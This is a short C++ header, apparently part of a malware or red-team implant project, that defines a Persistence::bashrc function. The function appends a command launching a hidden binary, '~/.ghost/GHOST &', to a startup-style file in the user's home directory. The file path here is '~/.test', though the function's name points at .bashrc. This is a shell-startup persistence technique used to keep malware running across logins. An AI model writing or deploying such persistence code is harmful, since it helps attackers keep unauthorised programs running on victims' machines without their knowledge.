#ifndef PERSISTENCE_HPP
#define PERSISTENCE_HPP

#include <iostream>
#include <cstdlib>
#include "../utils.hpp"

namespace Persistence {
    int bashrc() {
        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            std::cout << "SYS ERR no $HOME\n";
            return 1;
        }

        std::string path = std::string(homeEnv) + "/.test";
        std::string payload = "~/.ghost/GHOST &";

        if (Utils::appendToFile(path, payload)) {
            return 0;
        }

        std::cout << "SYS ERR cant append/no file\n";
        return -1;
    }
}

#endif